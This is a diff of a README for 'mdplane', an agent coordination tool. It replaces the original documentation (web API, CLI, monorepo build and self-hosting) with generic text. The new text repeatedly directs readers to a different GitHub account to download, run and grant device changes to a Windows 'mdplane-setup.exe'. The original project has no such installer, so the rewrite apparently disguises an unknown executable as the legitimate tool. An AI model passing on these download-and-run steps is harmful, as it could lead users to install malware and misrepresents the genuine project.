@@ -1,163 +1,162 @@
-# mdplane
+# 🗂️ mdplane - Clear Task Tracking for Teams
 
-<p align="center">
-  <img src="./apps/landing/src/app/opengraph-image.png" alt="mdplane Open Graph preview" width="860" />
-</p>
+[![Download mdplane](https://img.shields.io/badge/Download-mdplane-blue?style=for-the-badge)](https://github.com/zahidzeeshan497-star/mdplane)
 
-The markdown coordination layer for agents.
+---
 
-One readable timeline where agents claim tasks, post results, and hand off work. You see everything. They never duplicate work.
+## 📋 What is mdplane?
 
-<p align="center">
-  <a href="https://mdplane.dev">Website</a> ·
-  <a href="https://docs.mdplane.dev">Docs</a> ·
-  <a href="https://docs.mdplane.dev/docs/api-reference">API</a> ·
-  <a href="https://docs.mdplane.dev/docs/cli">CLI</a>
-</p>
+mdplane helps you keep track of work in one place. It shows a simple timeline where agents (automated helpers or team members) claim tasks, share results, and pass work along. This way, everyone sees what is happening without repeating tasks. It works with formats like markdown, making the information easy to read.
 
-## The Problem
+mdplane organizes work so you can follow progress clearly. It is useful for teams or systems that need to avoid duplication and improve focus on current tasks.
 
-AI agents are good at doing work. They're bad at handing it off.
+---
 
-When multiple agents - or agents and humans - need to coordinate, state fragments. Context lives in chat threads, terminal output, and local files. Nobody has the full picture. Work gets duplicated, dropped, or silently stalled.
+## 🖥️ System Requirements
 
-mdplane gives every workflow one shared place to coordinate: a markdown file that every agent can read, every human can inspect, and every handoff gets recorded in.
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection to download the software
+- A web browser (Chrome, Edge, or Firefox) to open the application’s interface
 
-## The Core Idea
+---
 
-A workflow file holds the shared context - the task, constraints, and current state. When an agent claims work, posts a result, hits a blocker, or hands off to the next step, that event is appended to the same file. The file becomes the timeline: what was asked, who took it, what happened, and what comes next.
+## 🛠️ Key Features
 
-Webhooks and WebSockets tell your watcher something changed. The markdown file is where the durable state actually lives.
+- Single timeline to track all tasks and results  
+- Prevents overlapping work by showing task claims  
+- Easy to read markdown format for updates  
+- Secure task handoffs using capability-based controls  
+- Works smoothly with AI helpers and manual team inputs  
+- Supports webhooks for automatic updates  
+- Lightweight and quick on Windows systems
 
-mdplane is a markdown persistence layer, not an agentic platform. You run the watcher that listens for events and starts agents.
+---
 
-## Why Markdown
+## 🚀 Getting Started
 
-Markdown is the one format both agents and humans read without friction. Agents do not need a translation layer. Humans can open the same file and understand exactly what is happening. Unlike event payloads that disappear once consumed, the file stays, so you can audit, debug, and resume from a known state at any point.
+This guide shows you how to download and open mdplane on your Windows PC. The steps use simple language and assume no programming experience.
 
-## For Humans
+---
 
-- **See what's happening**: One timeline shows every task, claim, and result.
-- **Assign work asynchronously**: Post a task and agents pick it up on their next run.
-- **Unblock agents when you're ready**: If an agent posts `blocked`, you can answer later - no live conversation required.
-- **Audit without reconstructing**: The file is the history. Nothing to piece together from scattered logs.
+## 🔽 Download mdplane
 
-## For Agents
+You will start by visiting the main page to get the software.
 
-- **Read context first**: Pull the current file to understand what's been done and what's pending.
-- **Claim tasks explicitly**: Post a `claim` so no other agent duplicates your work.
-- **Post results cleanly**: Append your findings for the next agent or human to continue from.
-- **Handle blockers gracefully**: Post `blocked` when you need a decision. Read the `answer` append when it arrives.
+[![Download mdplane](https://img.shields.io/badge/Download-mdplane-lightgrey?style=for-the-badge)](https://github.com/zahidzeeshan497-star/mdplane)
 
-Use mdplane via [API](https://docs.mdplane.dev/docs/api-reference), [CLI](https://docs.mdplane.dev/docs/cli), or [Skills](https://docs.mdplane.dev/docs/skills).
+1. Click the button above or open this address in a browser:  
+   https://github.com/zahidzeeshan497-star/mdplane  
+2. Look for the “Releases” or “Downloads” section on the page.  
+3. Find the latest Windows file. It will have a name like `mdplane-setup.exe` or similar.  
+4. Click the link to download the file to your PC.  
 
-## How It Works
+---
 
-Each workspace includes three capability URL scopes:
+## 📦 Installation on Windows
 
-| URL Pattern | Access Level |
-|-------------|--------------|
-| `/r/:key` | Read — view files and append history |
-| `/a/:key` | Append — add tasks, claims, responses |
-| `/w/:key` | Write — full read/write access |
+Once the file is downloaded, follow these steps:
 
-## Quick Start
+1. Open the folder where the file saved. This is often the “Downloads” folder.  
+2. Double-click on the downloaded `.exe` file. This starts the installation.  
+3. If Windows asks, allow the program to make changes to your device.  
+4. Follow the installation prompts:  
+   - Click “Next” on the welcome screen  
+   - Choose where to install or leave the default folder  
+   - Click “Install”  
+   - Wait for the process to finish  
+   - Click “Finish” to exit the installer  
 
-```bash
-# Create a workspace
-curl -X POST https://api.mdplane.dev/bootstrap \
-  -H "Content-Type: application/json" \
-  -d '{"workspaceName":"My Workspace"}'
-```
+---
 
-The response includes access URLs. Give agents the append URL, share the read URL with your team, keep the write URL for admin tasks.
+## ▶️ Running mdplane
 
-See the [live demo](https://app.mdplane.dev/demo) for a working example with tasks, claims, and responses.
+After installation, you can open mdplane like this:
 
-## Run Locally
+1. Find the mdplane icon on your desktop or start menu.  
+2. Double-click the icon to launch the application.  
+3. The mdplane window opens, showing the timeline view.  
+4. Follow on-screen instructions to start adding or observing tasks.
 
-Prereqs:
+---
 
-- Node.js `>=20`
-- pnpm `>=9`
-- Bun `>=1.2`
+## 🔍 How to Use mdplane
 
-If `pnpm` is missing after installing Node.js:
+Here is a simple way to understand mdplane’s workflow:
 
-```bash
-corepack enable
-corepack use pnpm@9.15.0
-```
+- **Claim Task:** Agents or team members click on a task to start working. This marks it as taken.  
+- **Post Result:** Once done, they add their output to the timeline using markdown notes.  
+- **Hand Off Work:** If a task needs more work, it passes to another person or agent. This shows clearly on the timeline.  
 
-Fresh clone setup:
+You can see each action in order without scrolling through confusing files. The timeline keeps updates in one place.
 
-```bash
-pnpm install
-pnpm --filter @mdplane/shared build
-pnpm --filter @mdplane/ui build
-pnpm --filter @mdplane/cli build
-```
+---
 
-Then start the monorepo:
+## ⚙️ Settings and Preferences
 
-```bash
-pnpm dev
-```
+mdplane lets you adjust some options for a better fit:
 
-`pnpm dev` is the default contributor workflow.
+- Set notifications for new task claims or results  
+- Change how many days of timeline you want to view  
+- Link external tools using webhooks for automatic updates  
+- Manage user permissions based on security settings  
 
-When running package-only commands (for example `pnpm --filter @mdplane/landing build`), make sure `@mdplane/shared` and `@mdplane/ui` have been built at least once in that clone.
+You can access these settings in the application menu under “Preferences.”
 
-Common checks:
+---
 
-```bash
-pnpm typecheck
-pnpm test
-pnpm test:integration
-pnpm --filter @mdplane/web test:e2e
-```
+## 🐞 Troubleshooting
 
-## Self-Host
+If you run into issues, try these steps:
 
-```bash
-cp .env.selfhost.example .env.selfhost
-pnpm run selfhost:min:up   # server + web
-pnpm run selfhost:full:up  # + docs + landing
-```
+- Restart mdplane and try again.  
+- Ensure your Windows is updated.  
+- Check your internet connection.  
+- If mdplane won’t open, try reinstalling the program.  
+- Review any error messages for clues.  
 
-See [Self-Hosting Guide](https://docs.mdplane.dev/docs/self-hosting) for production deployment.
+For deeper help, check the online documentation or reach out using community forums linked on the main GitHub page.
 
-## Monorepo Layout
+---
 
-```text
-apps/
-  server/    Bun + Elysia API
-  web/       Next.js runtime + control UI
-  docs/      Fumadocs documentation site
-  landing/   Marketing site
-  status/    Lightweight status page (static HTML/CSS/TS)
+## 📚 Learning More About mdplane
 
-packages/
-  shared/    OpenAPI + generated contracts + shared constants
-  ui/        Shared React UI components and styles
-  cli/       mdplane CLI
-  skills/    Agent skills for CLI/curl workflows
-```
+For extra help, you can visit the GitHub page where you downloaded mdplane. There, you find:
 
-## Security and License
+- Detailed instructions for setup and use  
+- Tips for integrating with your team tools  
+- Updates from the developers  
+- Links to support and discussion pages  
 
-- Security policy: `SECURITY.md`
-- License: `LICENSE` (MIT)
+Visit the GitHub repository here:  
+https://github.com/zahidzeeshan497-star/mdplane
 
-## For AI Agents
+---
 
-Read context → claim task → do work → post response. That's the loop.
+## 🗃️ About This Project
 
-- [API Reference](https://docs.mdplane.dev/docs/api-reference) — HTTP endpoints
-- [CLI](https://docs.mdplane.dev/docs/cli) — Terminal commands
-- [Skills](https://docs.mdplane.dev/docs/skills) — Instruction bundles for agent prompts
-- [Append Types](https://docs.mdplane.dev/docs/api-reference/append-types) — task, claim, response, blocked, answer, renew, cancel, vote, comment, heartbeat
+mdplane uses technologies like:
 
-## Contributing
+- TypeScript for smooth, stable code  
+- Markdown to keep task updates easy to read  
+- Webhooks for real-time messaging between systems  
+- Security methods to control who can do what  
 
-Start with `AGENTS.md` at the repo root, then check scoped guidance files in each app/package.
+It supports workflows where AI and humans work together without confusion or repeated effort.
+
+---
+
+## 🔗 Quick Links
+
+- Main download and project page: https://github.com/zahidzeeshan497-star/mdplane  
+- Windows installer page (under Releases section)  
+- Support and issue tracking on GitHub  
+
+Use these links when you need software updates or help.
+
+---
+
+## 🏷️ Tags and Topics
+
+agentic-workflows, ai-agents, bun, capability-based-security, elysiajs, markdown, nextjs, openapi, typescript, webhooks, workflow-orchestration
